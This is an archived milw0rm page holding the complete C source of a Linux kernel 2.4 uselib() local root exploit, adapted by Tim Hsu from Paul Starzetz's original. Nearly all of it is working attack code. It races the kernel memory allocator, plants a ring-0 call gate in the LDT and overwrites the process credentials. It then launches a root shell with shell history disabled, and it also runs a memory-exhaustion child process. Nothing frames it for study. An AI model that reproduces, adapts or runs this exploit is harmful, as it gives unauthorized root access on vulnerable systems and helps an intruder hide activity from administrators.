<html><head><title>Linux Kernel 2.4 uselib() Privilege Elevation Exploit</title></head><pre>/*
 * Linux kernel 2.4 uselib() privilege elevation exploit.
 *
 * original exploit source from http://isec.pl
 * reference: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
 *
 * I modified the Paul Starzetz's exploit, made it more possible
 * to race successfully. The exploit still works only on 2.4 series.  
 * It should be also works on 2.4 SMP, but not easy. 
 *
 * thx newbug.
 *
 * Tim Hsu &lt;timhsu at chroot.org&gt; Jan 2005.
 *
 */
 
#define _GNU_SOURCE

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;sched.h&gt;
#include &lt;syscall.h&gt;
#include &lt;limits.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/sysinfo.h&gt;

#include &lt;linux/elf.h&gt;
#include &lt;linux/linkage.h&gt;

#include &lt;asm/page.h&gt;
#include &lt;asm/ldt.h&gt;
#include &lt;asm/segment.h&gt;

#define str(s) #s
#define xstr(s) str(s)

#define MREMAP_MAYMOVE  1


//	temp lib location
#define LIBNAME 	&quot;/tmp/_elf_lib&quot;

//	shell name
#define	SHELL		&quot;/bin/bash&quot;

//	time delta to detect race
#define RACEDELTA	5000

//	if you have more deadbabes in memory, change this
#define MAGIC		0xdeadbabe


//	do not touch
#define	SLAB_THRSH	128
#define	SLAB_PER_CHLD	(INT_MAX - 1)
#define LIB_SIZE	( PAGE_SIZE * 4 )
#define STACK_SIZE	( PAGE_SIZE * 4 )

#define LDT_PAGES	( (LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1)/PAGE_SIZE )

#define ENTRY_GATE	( LDT_ENTRIES-1 )
#define SEL_GATE	( (ENTRY_GATE&lt;&lt;3)|0x07 )

#define ENTRY_LCS	( ENTRY_GATE-2 )
#define SEL_LCS		( (ENTRY_LCS&lt;&lt;3)|0x04 )

#define ENTRY_LDS	( ENTRY_GATE-1 )
#define SEL_LDS		( (ENTRY_LDS&lt;&lt;3)|0x04 )

#define kB		* 1024
#define MB		* 1024 kB
#define GB		* 1024 MB

#define TMPLEN		256
#define PGD_SIZE	( PAGE_SIZE*1024 )


extern char **environ;

static char cstack[STACK_SIZE];
static char name[TMPLEN];
static char line[TMPLEN];

static pid_t consume_pid;

static volatile int
	val = 0,
	go = 0,
	finish = 0,
	scnt = 0,
	ccnt=0,
	delta = 0,
	delta_max = RACEDELTA,
	map_flags = PROT_WRITE|PROT_READ;


static int
	fstop=0,
	silent=0,
	pidx,
	pnum=0,
	smp_max=0,
	smp,
	wtime=2,
	cpid,
	uid,
	task_size,
	old_esp,
	lib_addr,
	map_count=0,
	map_base=0,
	map_addr,
	addr_min,
	addr_max,
	vma_start,
	vma_end,
	max_page;


static struct timeval tm1, tm2;

static char *myenv[] = {&quot;TERM=vt100&quot;,
			&quot;HISTFILE=/dev/null&quot;,
			NULL};

static char hellc0de[] = &quot;\x49\x6e\x74\x65\x6c\x65\x63\x74\x75\x61\x6c\x20\x70\x72\x6f\x70&quot;
                         &quot;\x65\x72\x74\x79\x20\x6f\x66\x20\x49\x68\x61\x51\x75\x65\x52\x00&quot;;


static char *pagemap, *libname=LIBNAME, *shellname=SHELL;



#define __NR_sys_gettimeofday	__NR_gettimeofday
#define __NR_sys_sched_yield	__NR_sched_yield
#define __NR_sys_madvise	__NR_madvise
#define __NR_sys_uselib		__NR_uselib
#define __NR_sys_mmap2		__NR_mmap2
#define __NR_sys_munmap		__NR_munmap
#define __NR_sys_mprotect	__NR_mprotect
#define __NR_sys_mremap		__NR_mremap

inline _syscall6(int, sys_mmap2, int, a, int, b, int, c, int, d, int, e, int, f);

inline _syscall5(int, sys_mremap, int, a, int, b, int, c, int, d, int, e);

inline _syscall3(int, sys_madvise, void*, a, int, b, int, c);
inline _syscall3(int, sys_mprotect, int, a, int, b, int, c);
inline _syscall3( int, modify_ldt, int, func, void *, ptr, int, bytecount );

inline _syscall2(int, sys_gettimeofday, void*, a, void*, b);
inline _syscall2(int, sys_munmap, int, a, int, b);

inline _syscall1(int, sys_uselib, char*, l);

inline _syscall0(void, sys_sched_yield);

 
int consume_memory()
{
	struct sysinfo info;
	char *vmem;
	
	sysinfo(&amp;info);
	vmem = malloc(info.freeram);
	if (vmem == NULL)
	{
		perror(&quot;malloc&quot;);
		return -1;
	}
	memset(vmem, 0x90, info.freeram);

}


inline int tmdiff(struct timeval *t1, struct timeval *t2)
{
int r;

	r=t2-&gt;tv_sec - t1-&gt;tv_sec;
	r*=1000000;
	r+=t2-&gt;tv_usec - t1-&gt;tv_usec;
return r;
}


void fatal(const char *message, int critical)
{
int sig = critical? SIGSTOP : (fstop? SIGSTOP : SIGKILL);

	if(!errno) {
		fprintf(stdout, &quot;\n[-] FAILED: %s &quot;, message);
	} else {
		fprintf(stdout, &quot;\n[-] FAILED: %s (%s) &quot;, message,
			(char*) (strerror(errno)) );
	}
	if(critical)
		printf(&quot;\nCRITICAL, entering endless loop&quot;);
	printf(&quot;\n&quot;);
	fflush(stdout);

	unlink(libname);
	kill(cpid, SIGKILL);
	for(;;) kill(0, sig);
}


//	try to race do_brk sleeping on kmalloc, may need modification for SMP
int raceme(void* v)
{
	finish=1;

	for(;;) {
		errno = 0;

//	check if raced:
recheck:
		if(!go) sys_sched_yield();
		sys_gettimeofday(&amp;tm2, NULL);
		delta = tmdiff(&amp;tm1, &amp;tm2);
		if(!smp_max &amp;&amp; delta &lt; (unsigned)delta_max) goto recheck;
		smp = smp_max;

//	check if lib VMAs exist as expected under race condition
recheck2:
		val = sys_madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL);
		if(val) continue;
		errno = 0;
		val = sys_madvise((void*) (lib_addr+PAGE_SIZE),
				LIB_SIZE-PAGE_SIZE, MADV_NORMAL);
		if( !val || (val&lt;0 &amp;&amp; errno!=ENOMEM) ) continue;

//	SMP?
		smp--;
		if(smp&gt;=0) goto recheck2;

//	recheck race
		if(!go) continue;
		finish++;

//	we need to free one vm_area_struct for mmap to work
		val = sys_mprotect(map_addr, PAGE_SIZE, map_flags);
		if(val) fatal(&quot;mprotect&quot;, 0);
		val = sys_mmap2(lib_addr + PAGE_SIZE, PAGE_SIZE*3, PROT_NONE,
			      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
		if(-1==val) fatal(&quot;mmap2 race&quot;, 0);
		printf(&quot;\n[+] race won maps=%d&quot;, map_count); fflush(stdout);
		kill(consume_pid, SIGKILL);
		_exit(0);
	}

return 0;
}


int callme_1()
{
	return val++;
}


inline int valid_ptr(unsigned ptr)
{
	return ptr&gt;=task_size &amp;&amp; ptr&lt;addr_min-16;
}


inline int validate_vma(unsigned *p, unsigned s, unsigned e)
{
unsigned *t;

	if(valid_ptr(p[0]) &amp;&amp; valid_ptr(p[3]) &amp;&amp; p[1]==s &amp;&amp; p[2]==e) {
		t=(unsigned*)p[3];
		if( t[0]==p[0] &amp;&amp; t[1]&lt;=task_size &amp;&amp; t[2]&lt;=task_size )
			return 1;
	}
	return 0;
}


asmlinkage void kernel_code(unsigned *task)
{
unsigned *addr = task;

//	find &amp; reset uids
	while(addr[0] != uid || addr[1] != uid ||
	      addr[2] != uid || addr[3] != uid)
		addr++;

	addr[0] = addr[1] = addr[2] = addr[3] = 0;
	addr[4] = addr[5] = addr[6] = addr[7] = 0;

//	find &amp; correct VMA
	for(addr=(unsigned *)task_size; (unsigned)addr&lt;addr_min-16; addr++) {
		if( validate_vma(addr, vma_start, vma_end) ) {
			addr[1] = task_size - PAGE_SIZE;
			addr[2] = task_size;
			break;
		}
	}
}


void kcode(void);

//	CPL0 code mostly stolen from cliph
void __kcode(void)
{
asm(
	&quot;kcode:						\n&quot;
	&quot;	pusha					\n&quot;
	&quot;	pushl	%es				\n&quot;
	&quot;	pushl	%ds				\n&quot;
	&quot;	movl	$(&quot; xstr(SEL_LDS) &quot;) ,%edx	\n&quot;
	&quot;	movl	%edx,%es			\n&quot;
	&quot;	movl	%edx,%ds			\n&quot;
	&quot;	movl	$0xffffe000,%eax		\n&quot;
	&quot;	andl	%esp,%eax			\n&quot;
	&quot;	pushl	%eax				\n&quot;
	&quot;	call	kernel_code			\n&quot;
	&quot;	addl	$4, %esp			\n&quot;
	&quot;	popl	%ds				\n&quot;
	&quot;	popl	%es				\n&quot;
	&quot;	popa					\n&quot;
	&quot;	lret					\n&quot;
    );
}


int callme_2()
{
	return val + task_size + addr_min;
}


void sigfailed(int v)
{
	ccnt++;
	fatal(&quot;lcall&quot;, 1);
}


//	modify LDT &amp; exec
void try_to_exploit(unsigned addr)
{
volatile int r, *v;

	printf(&quot;\n[!] try to exploit 0x%.8x&quot;, addr); fflush(stdout);
	unlink(libname);

	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE|map_flags);
	if(r) fatal(&quot;mprotect 1&quot;, 1);

//	check if really LDT
	v = (void*) (addr + (ENTRY_GATE*LDT_ENTRY_SIZE % PAGE_SIZE) );
	signal(SIGSEGV, sigfailed);
	r = *v;
	if(r != MAGIC) {
		printf(&quot;\n[-] FAILED val = 0x%.8x&quot;, r); fflush(stdout);
		fatal(&quot;find LDT&quot;, 1);
	}

//	yeah, setup CPL0 gate
	v[0] = ((unsigned)(SEL_LCS)&lt;&lt;16) | ((unsigned)kcode &amp; 0xffffU);
	v[1] = ((unsigned)kcode &amp; ~0xffffU) | 0xec00U;
	printf(&quot;\n[+] gate modified ( 0x%.8x 0x%.8x )&quot;, v[0], v[1]); fflush(stdout);

//	setup CPL0 segment descriptors (we need the 'accessed' versions ;-)
	v = (void*) (addr + (ENTRY_LCS*LDT_ENTRY_SIZE % PAGE_SIZE) );
	v[0] = 0x0000ffff; /* kernel 4GB code at 0x00000000 */
	v[1] = 0x00cf9b00;

	v = (void*) (addr + (ENTRY_LDS*LDT_ENTRY_SIZE % PAGE_SIZE) );
	v[0] = 0x0000ffff; /* kernel 4GB data at 0x00000000 */
	v[1] = 0x00cf9300;

//	reprotect to get only one big VMA
	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|map_flags);
	if(r) fatal(&quot;mprotect 2&quot;, 1);

//	CPL0 transition
	sys_sched_yield();
	val = callme_1() + callme_2();
	asm(&quot;lcall $&quot; xstr(SEL_GATE) &quot;,$0x0&quot;);
	//if( getuid()==0 || (val==31337 &amp;&amp; strlen(hellc0de)==31337) ) {
	if (getuid()==0) {
		printf(&quot;\n[+] exploited, uid=0\n\n&quot; ); fflush(stdout);
	} else {
		printf(&quot;\n[-] uid change failed&quot; ); fflush(stdout);
		sigfailed(0);
	}
	signal(SIGTERM, SIG_IGN);
	kill(0, SIGTERM);
	setresuid(0, 0, 0);
	execl(shellname, &quot;sh&quot;, NULL);
	fatal(&quot;execl&quot;, 0);
}


void scan_mm_finish();
void scan_mm_start();


//	kernel page table scan code
void scan_mm()
{
	map_addr -= PAGE_SIZE;
	if(map_addr &lt;= (unsigned)addr_min)
		scan_mm_start();

	scnt=0;
	val = *(int*)map_addr;
	scan_mm_finish();
}


void scan_mm_finish()
{
retry:
	__asm__(&quot;movl	%0, %%esp&quot; : :&quot;m&quot;(old_esp) );

	if(scnt) {
		pagemap[pidx] ^= 1;
	}
	else {
		sys_madvise((void*)map_addr, PAGE_SIZE, MADV_DONTNEED);
	}
	pidx--;
	scan_mm();
	goto retry;
}


//	make kernel page maps before and after allocating LDT
void scan_mm_start()
{
static int npg=0;
static struct modify_ldt_ldt_s l;
//static struct user_desc l;
	pnum++;
	if(pnum==1) {
		pidx = max_page-1;
	}
	else if(pnum==2) {
		memset(&amp;l, 0, sizeof(l));
		l.entry_number = LDT_ENTRIES-1;
		l.seg_32bit = 1;
		l.base_addr = MAGIC &gt;&gt; 16;
		l.limit = MAGIC &amp; 0xffff;
		l.limit_in_pages = 1;
		if( modify_ldt(1, &amp;l, sizeof(l)) != 0 )
			fatal(&quot;modify_ldt&quot;, 1);
		pidx = max_page-1;
	}
	else if(pnum==3) {
		npg=0;
		for(pidx=0; pidx&lt;=max_page-1; pidx++) {
			if(pagemap[pidx]) {
				npg++;
			}
			else if(npg == LDT_PAGES) {
				npg=0;
				try_to_exploit(addr_min+(pidx-1)*PAGE_SIZE);
			} else {
				npg=0;
			}
		}
		fatal(&quot;find LDT&quot;, 1);
	}

//	save context &amp; scan page table
	__asm__(&quot;movl	%%esp, %0&quot; : :&quot;m&quot;(old_esp) );
	map_addr = addr_max;
	scan_mm();
}


//	return number of available SLAB objects in cache
int get_slab_objs(const char *sn)
{
static int c, d, u = 0, a = 0;
FILE *fp=NULL;
char x1[20];

	fp = fopen(&quot;/proc/slabinfo&quot;, &quot;r&quot;);
	if(!fp)
		fatal(&quot;get_slab_objs: fopen&quot;, 0);
	fgets(name, sizeof(name) - 1, fp);
	do {
		c = u = a = -1;
		if (!fgets(line, sizeof(line) - 1, fp))
			break;
		c = sscanf(line, &quot;%s %u %u %u %u %u %u&quot;, name, &amp;u, &amp;a,
			   &amp;d, &amp;d, &amp;d, &amp;d);
	} while (strcmp(name, sn));
	close(fileno(fp));
	fclose(fp);
	return c == 7 ? a - u : -1;
}

long memmaped_size = 0;

//	leave one object in the SLAB
inline void prepare_slab()
{
int *r;

	map_addr -= PAGE_SIZE;
	map_count++;
	map_flags ^= PROT_READ;
		
	r = (void*)sys_mmap2((unsigned)map_addr, PAGE_SIZE, map_flags,
			     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if(MAP_FAILED == r) {
		printf(&quot;--&gt; prepare_slab(), %dMb\n&quot;, memmaped_size/1024/1024);
		fatal(&quot;try again&quot;, 0);
	}
	memmaped_size += PAGE_SIZE;
	*r = map_addr;
}


//	sig handlers
void segvcnt(int v)
{
	scnt++;
	scan_mm_finish();
}


//	child reap
void reaper(int v)
{
	ccnt++;
	waitpid(0, &amp;v, WNOHANG|WUNTRACED);
}


//	sometimes I get the VMAs in reversed order...
//	so just use anyone of the two but take care about the flags
void check_vma_flags();

void vreversed(int v)
{
	map_flags = 0;
	check_vma_flags();
}


void check_vma_flags()
{
	if(map_flags) {
		__asm__(&quot;movl	%%esp, %0&quot; : :&quot;m&quot;(old_esp) );
	} else {
		__asm__(&quot;movl	%0, %%esp&quot; : :&quot;m&quot;(old_esp) );
		goto out;
	}
	signal(SIGSEGV, vreversed);
	val = * (unsigned*)(lib_addr + PAGE_SIZE);
out:
}


//	use elf library and try to sleep on kmalloc
void exploitme()
{
int r, sz, pcnt=0;
static char smiley[]=&quot;-\\|/-\\|/&quot;;

//	printf(&quot;\n    cat /proc/%d/maps&quot;, getpid() ); fflush(stdout);
//	helper clone
	finish=0; ccnt=0;
	sz = sizeof(cstack) / sizeof(cstack[0]);
	cpid = clone(&amp;raceme, (void*) &amp;cstack[sz-16],
			CLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD, NULL );
	if(-1==cpid) fatal(&quot;clone&quot;, 0);

//	synchronize threads
	while(!finish) sys_sched_yield();
	finish=0;
	if(!silent) {
		printf(&quot;\n&quot;); fflush(stdout);
	}

//	try to hit the kmalloc race
	for(;;) {

		r = get_slab_objs(&quot;vm_area_struct&quot;);
		//printf(&quot;\nfree slab = %d\n&quot;,r);
		while(r != 1 &amp;&amp; r &gt; 0) {
			prepare_slab();
			r--;
		}

		sys_gettimeofday(&amp;tm1, NULL);
		go = 1;
		r=sys_uselib(libname);
		go = 0;
		if(r) fatal(&quot;uselib&quot;, 0);
		if(finish) break;

//	wipe lib VMAs and try again
		r = sys_munmap(lib_addr, LIB_SIZE);
		if(r) fatal(&quot;munmap lib&quot;, 0);
		if(ccnt) goto failed;

		if( !silent &amp;&amp; !(pcnt%64) ) {
			printf(&quot;\r    Wait... %c&quot;, smiley[ (pcnt/64)%8 ]);
			fflush(stdout);
		}
		pcnt++;
	}

//	seems we raced, free mem
	r = sys_munmap(map_addr, map_base-map_addr + PAGE_SIZE);
	if(r) fatal(&quot;munmap 1&quot;, 0);
	r = sys_munmap(lib_addr, PAGE_SIZE);
	if(r) fatal(&quot;munmap 2&quot;, 0);
	
//	relax kswapd
	sys_gettimeofday(&amp;tm1, NULL);
	for(;;) {
		sys_sched_yield();
		sys_gettimeofday(&amp;tm2, NULL);
		delta = tmdiff(&amp;tm1, &amp;tm2);
		if( wtime*1000000U &lt;= (unsigned)delta ) break;
	}

//	we need to check the PROT_EXEC flag
	map_flags = PROT_EXEC;
	check_vma_flags();
	if(!map_flags) {
		printf(&quot;\n    VMAs reversed&quot;); fflush(stdout);
	}

//	write protect brk's VMA to fool vm_enough_memory()
	r = sys_mprotect((lib_addr + PAGE_SIZE), LIB_SIZE-PAGE_SIZE,
			 PROT_READ|map_flags);
	if(-1==r) { fatal(&quot;mprotect brk&quot;, 0); }

//	this will finally make the big VMA...
	sz = (0-lib_addr) - LIB_SIZE - PAGE_SIZE;
expand:
	r = sys_madvise((void*)(lib_addr + PAGE_SIZE),
			LIB_SIZE-PAGE_SIZE, MADV_NORMAL);
	if(r) fatal(&quot;madvise&quot;, 0);
	r = sys_mremap(lib_addr + LIB_SIZE-PAGE_SIZE,
			PAGE_SIZE, sz, MREMAP_MAYMOVE, 0);
	if(-1==r) {
		if(0==sz) {
			fatal(&quot;mremap: expand VMA&quot;, 0);
		} else {
			sz -= PAGE_SIZE;
			goto expand;
		}
	}
	vma_start = lib_addr + PAGE_SIZE;
	vma_end = vma_start + sz + 2*PAGE_SIZE;
	printf(&quot;\n    expanded VMA (0x%.8x-0x%.8x)&quot;, vma_start, vma_end);
	fflush(stdout);

//	try to figure kernel layout
	signal(SIGCHLD, reaper);
	signal(SIGSEGV, segvcnt);
	signal(SIGBUS, segvcnt);
	scan_mm_start();

failed:
	printf(&quot;failed:\n&quot;);
	fatal(&quot;try again&quot;, 0);

}


//	make fake ELF library
void make_lib()
{
struct elfhdr eh;
struct elf_phdr eph;
static char tmpbuf[PAGE_SIZE];
int fd;

//	make our elf library
	umask(022);
	unlink(libname);
	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755);
	if(fd&lt;0) fatal(&quot;open lib (&quot;LIBNAME&quot; not writable?)&quot;, 0);
	memset(&amp;eh, 0, sizeof(eh) );

//	elf exec header
	memcpy(eh.e_ident, ELFMAG, SELFMAG);
	eh.e_type = ET_EXEC;
	eh.e_machine = EM_386;
	eh.e_phentsize = sizeof(struct elf_phdr);
	eh.e_phnum = 1;
	eh.e_phoff = sizeof(eh);
	write(fd, &amp;eh, sizeof(eh) );

//	section header:
	memset(&amp;eph, 0, sizeof(eph) );
	eph.p_type = PT_LOAD;
	eph.p_offset = 4096;
	eph.p_filesz = 4096;
	eph.p_vaddr = lib_addr;
	eph.p_memsz = LIB_SIZE;
	eph.p_flags = PF_W|PF_R|PF_X;
	write(fd, &amp;eph, sizeof(eph) );

//	execable code
	lseek(fd, 4096, SEEK_SET);
	memset(tmpbuf, 0x90, sizeof(tmpbuf) );
	write(fd, &amp;tmpbuf, sizeof(tmpbuf) );
	close(fd);
}


//	move stack down #2
void prepare_finish()
{
int r;
static struct sysinfo si;

	old_esp &amp;= ~(PAGE_SIZE-1);
	old_esp -= PAGE_SIZE;
	task_size = ((unsigned)old_esp + 1 GB ) / (1 GB) * 1 GB;
	r = sys_munmap(old_esp, task_size-old_esp);
	if(r) fatal(&quot;unmap stack&quot;, 0);

//	setup rt env
	uid = getuid();
	lib_addr = task_size - LIB_SIZE - PAGE_SIZE;
	if(map_base)
		map_addr = map_base;
	else
		map_base = map_addr = (lib_addr - PGD_SIZE) &amp; ~(PGD_SIZE-1);
	printf(&quot;\n[+] moved stack %x, task_size=0x%.8x, map_base=0x%.8x&quot;,
		old_esp, task_size, map_base); fflush(stdout);

//	check physical mem &amp; prepare
	sysinfo(&amp;si);
	addr_min = task_size + si.totalram;
	addr_min = (addr_min + PGD_SIZE - 1) &amp; ~(PGD_SIZE-1);
	addr_max = addr_min + si.totalram;
	if((unsigned)addr_max &gt;= 0xffffe000 || (unsigned)addr_max &lt; (unsigned)addr_min)
		addr_max = 0xffffd000;

	printf(&quot;\n[+] vmalloc area 0x%.8x - 0x%.8x&quot;, addr_min, addr_max);
	max_page = (addr_max - addr_min) / PAGE_SIZE;
	pagemap = malloc( max_page + 32 );
	if(!pagemap) fatal(&quot;malloc pagemap&quot;, 1);
	memset(pagemap, 0, max_page + 32);

//	go go
	make_lib();
	exploitme();
}


//	move stack down #1
void prepare()
{
unsigned p=0;

	environ = myenv;

	p = sys_mmap2( 0, STACK_SIZE, PROT_READ|PROT_WRITE,
		       MAP_PRIVATE|MAP_ANONYMOUS, 0, 0	);
	if(-1==p) fatal(&quot;mmap2 stack&quot;, 0);
	p += STACK_SIZE - 64;

	__asm__(&quot;movl	%%esp, %0	\n&quot;
		&quot;movl 	%1, %%esp	\n&quot;
		: : &quot;m&quot;(old_esp), &quot;m&quot;(p)
	);

	prepare_finish();
}


void chldcnt(int v)
{
	ccnt++;
}


//	alloc slab objects...
inline void do_wipe()
{
int *r, c=0, left=0;

	__asm__(&quot;movl	%%esp, %0&quot; : : &quot;m&quot;(old_esp) );

	old_esp = (old_esp - PGD_SIZE+1) &amp; ~(PGD_SIZE-1);
	old_esp = map_base? map_base : old_esp;

	for(;;) {
		if(left&lt;=0)
			left = get_slab_objs(&quot;vm_area_struct&quot;);
		if(left &lt;= SLAB_THRSH)
			break;
		left--;

		map_flags ^= PROT_READ;
		old_esp -= PAGE_SIZE;
		r = (void*)sys_mmap2(old_esp, PAGE_SIZE, map_flags,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 );
		if(MAP_FAILED == r)
			break;

		if(c&gt;SLAB_PER_CHLD)
			break;
		if( (c%1024)==0 ) {
			if(!c) printf(&quot;\n&quot;);
			printf(&quot;\r    child %d VMAs %d&quot;, val, c);
			fflush(stdout);
		}
		c++;
	}
	printf(&quot;\r    child %d VMAs %d&quot;, val, c);
	fflush(stdout);
	kill(getppid(), SIGUSR1);
	for(;;) pause();
}


//	empty SLAB caches
void wipe_slab()
{
	signal(SIGUSR1, chldcnt);
	printf(&quot;\n[+] SLAB cleanup&quot;); fflush(stdout);
	for(;;) {
		ccnt=0;
		val++;
		cpid = fork();
		if(!cpid)
			do_wipe();

		while(!ccnt) sys_sched_yield();
		if( get_slab_objs(&quot;vm_area_struct&quot;) &lt;= SLAB_THRSH )
			break;
	}
	signal(SIGUSR1, SIG_DFL);
}


void usage(char *n)
{
	printf(&quot;\nUsage: %s\t-f forced stop\n&quot;, n);
	printf(&quot;\t\t-s silent mode\n&quot;);
	printf(&quot;\t\t-c command to run\n&quot;);
	printf(&quot;\t\t-n SMP iterations\n&quot;);
	printf(&quot;\t\t-d race delta us\n&quot;);
	printf(&quot;\t\t-w wait time seconds\n&quot;);
	printf(&quot;\t\t-l alternate lib name\n&quot;);
	printf(&quot;\t\t-a alternate addr hex\n&quot;);
	printf(&quot;\n&quot;);
	_exit(1);
}


//	give -s for forced stop, -b to clean SLAB
int main(int ac, char **av)
{
int r;

	while(ac) {
		r = getopt(ac, av, &quot;n:l:a:w:c:d:fsh&quot;);
		if(r&lt;0) break;

		switch(r) {

		case 'f' :
			fstop = 1;
			break;

		case 's' :
			silent = 1;
			break;

		case 'n' :
			smp_max = atoi(optarg);
			break;

		case 'd':
			if(1!=sscanf(optarg, &quot;%u&quot;, &amp;delta_max) || delta_max &gt; 100000u )
				fatal(&quot;bad delta value&quot;, 0);
			break;

		case 'w' :
			wtime = atoi(optarg);
			if(wtime&lt;0) fatal(&quot;bad wait value&quot;, 0);
			break;

		case 'l' :
			libname = strdup(optarg);
			break;

		case 'c' :
			shellname = strdup(optarg);
			break;

		case 'a' :
			if(1!=sscanf(optarg, &quot;%x&quot;, &amp;map_base))
				fatal(&quot;bad addr value&quot;, 0);
			map_base &amp;= ~(PGD_SIZE-1);
			break;

		case 'h' :
		default:
			usage(av[0]);
			break;
		}
	}
	consume_pid = fork();
	
	if (consume_pid == 0)
	{
		consume_memory();
		pause();
		return 0;
	}
//	basic setup
	uid = getuid();
	setpgrp();
	wipe_slab();
	prepare();

return 0;
}

// milw0rm.com [2005-01-27]</pre></html>